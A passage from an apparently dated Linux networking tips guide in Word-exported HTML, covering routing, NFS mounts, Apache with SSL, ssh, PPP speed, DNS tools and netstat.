0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >tcp-env: ip1, ip2, ip3: setenv = RELAYCLIENT</SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.8</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 8: Access to various networks</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Big corporations often sub-divide their networks into small networks, hidden behind gateways. To access</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >them, you need to tell your Linux system that there is a gateway to use to access the networks.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The route program makes it easy to add networks, hosts and gateways to your routing table. To add a default</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >gateway, for example to access the Internet, you can set it as default with the following line:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >route add default gw 10.0.0.1</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This will work if you need to access the Internet via the 10.0.0.1 gateway. Now, if you want to access</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >networks 10.1.0.0 and 10.2.0.0 through other gateways, here is what you will want to do:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >route add -net 10.1.0.0 gw 10.0.0.10</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >route add -net 10.2.0.0 gw 10.0.0.20</SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.9</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 9: Accessing remote file systems</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >SMB is the most popular protocol to access Windows systems. But from the Unix world comes NFS. NFS is</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >a way to share files that predates SMB and Samba, and comes compiled in most Linux distributions. To</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >enable file sharing, you must have the nfsd and mountd daemons running. You also need to add the IPs of the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >systems you want to allow in /etc/exports.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >To access remote file systems, you simply mount them like local hard drives. To mount /usr/files from 1.2.3.4</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >into /mnt/files, simply type:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >mount -tnfs 1.2.3.4:/usr/files /mnt/files</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The -tnfs parameter may be omited.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.10</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 10: Secure Web server</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Electronic commerce is becoming very popular on the Internet. Companies will often pay thousands of</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >dollars for commercial packages to deliver secure content to customers on the Web. You can setup one of the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >most popular Web servers, Apache, running on Linux and serving secure content, for free.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >To setup Apache to deliver secure content, you will need to get a cryptographic package called OpenSSL,</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><FONT face="Times New Roman"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >based on the SSLeay library. The place to start is at </SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  >http://www.apache-ssl.org</SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  >. From there, you can</SPAN></FONT></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >download the needed patches to make Apache into a secure web server.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Detailed instructions are available in the packages, but here is a quick step-by-step guide:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >First, you need to download 3 packages: Apache itself, the corresponding Apache-SSL patch</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >and OpenSSL.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Then you need to patch the Apache distribution and compile the SSL library.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >After editing the configuration file in the Apache directory, and setting the right paths and</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >libraries to use, you can compile Apache and then create a test certificate.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; FONT-FAMILY: Symbol; mso-font-kerning: 0pt; mso-bidi-font-family: Symbol;"  >· <SPAN style="mso-spacerun: yes;"  >&nbsp;</SPAN></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >All you have to do now is install Apache and configure it to use your test certificate.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Note that while Apache and the SSLeay libray are free, you may need to pay to get signed certificates from</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >commercial companies. Also, due to export laws in various countries, you may want to check your local laws</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >before using any encrypting product.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.11</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 11: Secure alternative to telnet</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Telnet is a protocol allowing you to connect to a remote system and run programs and commands on that</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >system. It is very old and still very much in use today.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Unfortunately, a telnet client sends the user password as clear text, and the connection is not encrypted. On</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >the other hand, a program called ssh exists that can replace both telnet and ftp in a secure, encrypted way.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Ssh stands for Secure Shell. It will encrypt each connection with a random key, so that it is impossible or at</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >least very hard for a third party to decrypt the connection and find the password, or spy on you.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.12</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 12: Speed problems on a PPP connection</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >PPPd is the PPP connection daemon. It will try to connect to a server using a specified speed. The default</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >speed is 38400. If you use a serial connection, or a 56.7Kbps modem, it may not be enough. If you want to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >use all the available bandwidth, you need to increase that number. For example, for a serial connection, you</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >want the speed set at 115200.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Another reason for speed drops is unwanted packets. You may want to filter unwanted packets out of your</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >network, like some ICMP messages and chat connections.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >A last possibility for speed drops is Denial of Service attacks. DoS attacks are unfortunately very real and</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >they occur a lot. Malicious people that can't handle their problems elsewhere turn to the Internet and launch</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >attacks against networks. An attack against one user will always affect several thousands of people. By using</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >bandwidth of an Internet provider to cause trouble to any one user, the whole provider will be affected. To</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >prevent such attacks, firewalls exist, and tracking tools were invented to deal with abusers. MCI has a tool</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >called DoSTrack that can be of help if you are victim of such an attack. For more information about various</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >DoS attacks, you should search the Web.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.13</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 13: Names and name servers</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Internet hostnames and domains are resolved using the Domain Name System (DNS) using Name Servers</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >(NS). These name servers are usually hosted by your Internet provider. You can also host your own name</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >server, using the program named. Every name server, upon receiving a request to resolve a hostname, will ask</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >an upstream name server if it doesn't know the answer. Your name server may ask your ISP's name server,</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >which will ask the backbone's main name server, which will ask a root server.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Linux knows which name server to ask by looking in /etc/resolv.conf. In that file, a number of name servers</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >may be specified in the following way:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >nameserver 192.168.0.1</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >nameserver 205.237.65.254</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The name server itself, named, has a configuration file which is usually /etc/named.conf. In that file, you</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >configure the domain names you are responsible for, and the zone file to use. A nice introduction to running a</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >name server is available in the various named man pages.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Various utilities are related to resolving hostnames. One is called whois, and will query the Internet main</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >name servers to know who owns a domain:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >whois linux.org</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Another utility is called nslookup. That command will allow you to resolve hosts, and to get all kinds of</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >information about a domain. See the man page for more.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow" ><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >2.14</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 14: Who owns this port</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Several utilities exist to check which ports are open, who is connected to your system and even what process</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >owns a port number.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >First a few ground rules. Ports below 1024 are reserved for common services, and only root can use them.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Standard port numbers can be found in /etc/services. The maximum number of ports is 65k, so you have more</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >than enough Internet ports for all your services.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Here are some useful utilities. Netstat is a command that will list both the open ports and who is connected to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >your system. You should run it like this:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >netstat -an | more</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This way you can find out who is connected to which service.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 